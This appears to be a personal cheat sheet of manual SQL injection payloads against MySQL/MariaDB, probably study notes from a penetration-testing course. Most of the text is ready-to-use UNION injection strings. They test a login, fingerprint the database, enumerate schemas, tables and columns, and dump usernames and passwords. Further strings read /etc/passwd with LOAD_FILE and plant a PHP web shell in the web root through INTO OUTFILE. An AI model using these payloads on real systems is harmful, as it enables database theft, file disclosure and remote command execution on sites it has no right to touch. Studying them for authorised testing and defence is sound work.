DATABASE ENUM:

check if login is vuln:
|
|--- cn' <- breaks statment

fingerprint db: <- use 'UNION SELECT 1,2,3,4 from yadayada
|
|--- select @@version <- full query is outputed
|
|--- select pow(1,1) <- only retive a int
|
|--- select sleep(7) <- not output(blind)

tables present within the database:
information_schema ----------+
                             |
                             |                             
schemata: <------------------+
|
|--- info on the database
|--- ' union select schema_name from information_schema.schemata-- -

tables: <- before dumping data you'll have to query the tables in the db
|
|--- 'tables' holds info about all tables within a db. don't forget to fill the right amout of columns
|
|--- 'tables_schema' <- point at the db where each tables belongs
|
|--- 'table_name' <- stores table names
|
|--- ' union select 1,table_name,table_schema,4 from information_schema.tables where table_schema='{$table}'-- -
|

columns: <- before dumping, we need to find the column names in the table
|
|--- 'columns' can be used to find the columns and the info of all the columns in the table
|
|---  'UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='{$column}'-- -

retv data:
|
|--- we got the info we need
|
|--- ' union select 1, {$user}, {$passwd}, 4 from {$database.table}-- -

FILE READ:

check for read priv: <- if the query returns 'Y', then yes we are super user
|
|--- check our user priv to see if we have super priv
|
|--- ' union select 1, super_priv, 3, 4 from mysql.user-- -
|
|--- or if we have many user
|
|--- ' union select 1, super_priv, 3, 4 from mysql.user where user='root'-- -
|
|--- grantee/privilege_type <- dumps other types of privleges(grantee is needed otherwise this won't work) 
|
|--- ' union select 1, grantee, privilege_type, 4 from information_schema.user_privileges-- -
|
|--- check for the word 'FILE', this means we can read files

load da file:
|
|--- in mariaDB and MySQL the load_file() can be use to read files
|
|--- ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

FILE WRITE:

check secure_file_priv:
|
|--- secure_file_priv makes out where to read and write files from
|
|--- the MySQL has the variable 'secure_file_priv' in the table 'global_variables' in which that is in information schema
|
|--- the table has two columns; variable_name and variable_value
|
|--- ' union select variable_name, variable_value from information_schema.global_variables where variable_name="secure_file_priv"-- -
|
|--- the 'select into outfile' statement is used to write some data from the select query into a file
|
|--- ' union select "",'<?php system("dir /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
|
|--- pay attention to the path, ex. path1/path2/path3
|
|--- certain paths restrict file read and write operations
